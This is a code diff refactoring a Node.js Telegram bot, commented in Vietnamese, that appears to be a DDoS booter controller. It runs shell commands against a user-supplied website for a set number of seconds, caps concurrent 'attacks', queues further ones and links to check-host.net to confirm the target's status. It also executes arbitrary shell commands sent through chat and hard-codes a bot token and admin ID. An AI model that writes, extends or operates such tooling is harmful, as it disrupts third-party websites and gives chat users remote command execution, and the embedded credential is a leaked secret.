@@ -1,26 +1,16 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const os = require('os');
-const formatJson = require('format-json'); // Thư viện định dạng JSON đẹp hơn
 
 // Cấu hình
 const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
 const adminId = 1243471275;
-const allowedGroupIds = new Set([
-    -1002423723717, // Thay thế bằng group ID thực tế
-    987654321,      // Thay thế bằng group ID thực tế
-    112233445,      // Thay thế bằng group ID thực tế
-    556677889,      // Thay thế bằng group ID thực tế
-    998877665       // Thay thế bằng group ID thực tế
-]);
-const maxConcurrentAttacks = 3; // Số lệnh tối đa có thể chạy đồng thời
-const maxSlot = 1;              // Số lệnh tối đa mỗi người dùng có thể chạy cùng lúc
-const maxTimeAttacks = 120;     // Thời gian tối đa cho mỗi lệnh (giây)
+const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
+const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;
 
 // Khởi tạo bot
 const bot = new TelegramBot(token, { polling: true });
-const currentAttacks = new Map(); // Lưu trữ tiến trình của từng người dùng
-const attackQueue = [];           // Hàng đợi các lệnh chờ thực thi
+const currentAttacks = new Map(), attackQueue = [];
 
 // Thông báo bot đã sẵn sàng
 let isBotReady = true;
@@ -30,8 +20,8 @@ console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.
 // Hàm gửi thông báo dưới dạng JSON đẹp
 const sendJsonMessage = async (chatId, data) => {
     try {
-        const formattedJson = formatJson.plain(data); // Định dạng JSON đẹp hơn
-        await bot.sendMessage(chatId, formattedJson, { parse_mode: 'Markdown' });
+        const formattedJson = `<pre><code>${JSON.stringify(data, null, 2)}</code></pre>`;
+        await bot.sendMessage(chatId, formattedJson, { parse_mode: 'HTML' });
     } catch (error) {
         console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
     }
@@ -39,39 +29,24 @@ const sendJsonMessage = async (chatId, data) => {
 
 // Hàm thực thi lệnh
 const executeCommand = async (chatId, command, host, time, username) => {
-    const startTime = new Date().toLocaleString();
-    const pid = Math.floor(Math.random() * 10000); // Tạo PID ngẫu nhiên
+    const startTime = new Date().toLocaleString(), pid = Math.floor(Math.random() * 10000);
 
     // Thông báo bắt đầu
     const startMessage = {
-        status: "🚀Successfully🚀",
-        pid: pid,
-        website: host,
-        time: `${time} Giây`,
-        caller: username,
-        startTime: startTime,
-        maxSlots: maxSlot,
-        checkHost: `[Check Host](https://check-host.net/check-http?host=${host})`
+        status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`,
+        caller: username, startTime, maxSlots: maxSlot
     };
     await sendJsonMessage(chatId, startMessage);
+    await bot.sendMessage(chatId, `[Check Host](https://check-host.net/check-http?host=${host})`, { parse_mode: 'Markdown' });
 
     const child = exec(command, { shell: '/bin/bash' });
     child.on('close', () => {
         const endTime = new Date().toLocaleString();
-
-        // Thông báo hoàn tất
         const completeMessage = {
-            status: "✅ Tiến trình hoàn tất",
-            pid: pid,
-            website: host,
-            time: `${time} Giây`,
-            caller: username,
-            startTime: startTime,
-            endTime: endTime
+            status: "✅ Tiến trình hoàn tất", pid, website: host, time: `${time} Giây`,
+            caller: username, startTime, endTime
         };
         sendJsonMessage(chatId, completeMessage);
-
-        // Xóa lệnh khỏi danh sách đang chạy
         currentAttacks.delete(chatId);
         if (attackQueue.length > 0) {
             const nextAttack = attackQueue.shift();
@@ -118,7 +93,7 @@ bot.on('message', async (msg) => {
         let output = '';
         child.stdout.on('data', (data) => output += data.toString());
         child.stderr.on('data', (data) => output += data.toString());
-        child.on('close', () => sendJsonMessage(chatId, { status: "🚀 Kết quả lệnh", command: command, output: output }));
+        child.on('close', () => sendJsonMessage(chatId, { status: "🚀 Kết quả lệnh", command, output }));
         return;
     }
 
